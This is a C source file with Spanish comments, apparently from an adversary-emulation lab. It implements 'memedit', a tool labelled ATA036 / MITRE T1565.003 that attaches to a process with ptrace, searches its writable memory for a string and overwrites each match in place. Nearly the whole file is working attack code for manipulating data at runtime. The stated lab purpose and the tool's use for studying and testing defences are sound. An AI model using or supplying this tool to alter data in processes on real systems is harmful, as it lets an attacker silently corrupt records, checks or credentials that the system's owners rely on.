/* ATA036 · T1565.003 Runtime Data Manipulation — manipulador de memoria "memedit"
 * ----------------------------------------------------------------------------
 * Se ADJUNTA (ptrace) al proceso de laboratorio, LOCALIZA el dato en uso en la
 * memoria del proceso (regiones escribibles de /proc/<pid>/maps, leyendo por
 * process_vm_readv) y lo SOBRESCRIBE con ptrace PTRACE_POKEDATA. Manipula datos
 * EN EJECUCION (memoria), no en reposo ni en transito.
 *
 * Solo actua sobre el PID que se le pasa (el proceso de laboratorio del ataque).
 *
 * Compilar (en la maquina con toolchain):
 *   gcc -O2 -o memedit ATA036_memedit.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "uso: memedit <pid> <viejo> <nuevo> (misma longitud)\n");
        return 2;
    }
    pid_t pid = (pid_t)atoi(argv[1]);
    const char *old = argv[2];
    const char *new = argv[3];
    size_t n = strlen(old);
    if (strlen(new) != n) {
        fprintf(stderr, "ERROR: 'nuevo' debe tener la misma longitud que 'viejo'\n");
        return 2;
    }

    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) { perror("PTRACE_ATTACH"); return 1; }
    if (waitpid(pid, NULL, 0) < 0) { perror("waitpid"); }

    char mapspath[64];
    snprintf(mapspath, sizeof mapspath, "/proc/%d/maps", (int)pid);
    FILE *f = fopen(mapspath, "r");
    if (!f) { perror("maps"); ptrace(PTRACE_DETACH, pid, 0, 0); return 1; }

    char line[512];
    int found = 0;
    while (fgets(line, sizeof line, f)) {
        unsigned long a = 0, b = 0;
        char perms[8] = {0};
        if (sscanf(line, "%lx-%lx %7s", &a, &b, perms) != 3) continue;
        if (perms[1] != 'w') continue;   /* solo regiones escribibles */
        for (unsigned long off = a; off < b; off += 4096) {
            char buf[4096];
            struct iovec local = { buf, sizeof buf };
            struct iovec remote = { (void *)off, sizeof buf };
            ssize_t r = process_vm_readv(pid, &local, 1, &remote, 1, 0);
            if (r <= 0) continue;
            for (ssize_t i = 0; i + (ssize_t)n <= r; i++) {
                if (memcmp(buf + i, old, n) == 0) {
                    unsigned long addr = off + (unsigned long)i;
                    for (size_t k = 0; k < n; k++) {
                        errno = 0;
                        long word = ptrace(PTRACE_PEEKDATA, pid, (void *)(addr + k), 0);
                        if (word == -1 && errno) { perror("PEEKDATA"); continue; }
                        word = (word & ~0xffL) | (unsigned char)new[k];
                        if (ptrace(PTRACE_POKEDATA, pid, (void *)(addr + k), (void *)word) < 0)
                            perror("POKEDATA");
                    }
                    printf("FOUND addr=0x%lx old=%s new=%s\n", addr, old, new);
                    found = 1;
                }
            }
        }
    }
    fclose(f);
    ptrace(PTRACE_DETACH, pid, 0, 0);
    if (!found) {
        fprintf(stderr, "NO_ENCONTRADO: '%s' no esta en la memoria de %d\n", old, (int)pid);
        return 1;
    }
    return 0;
}
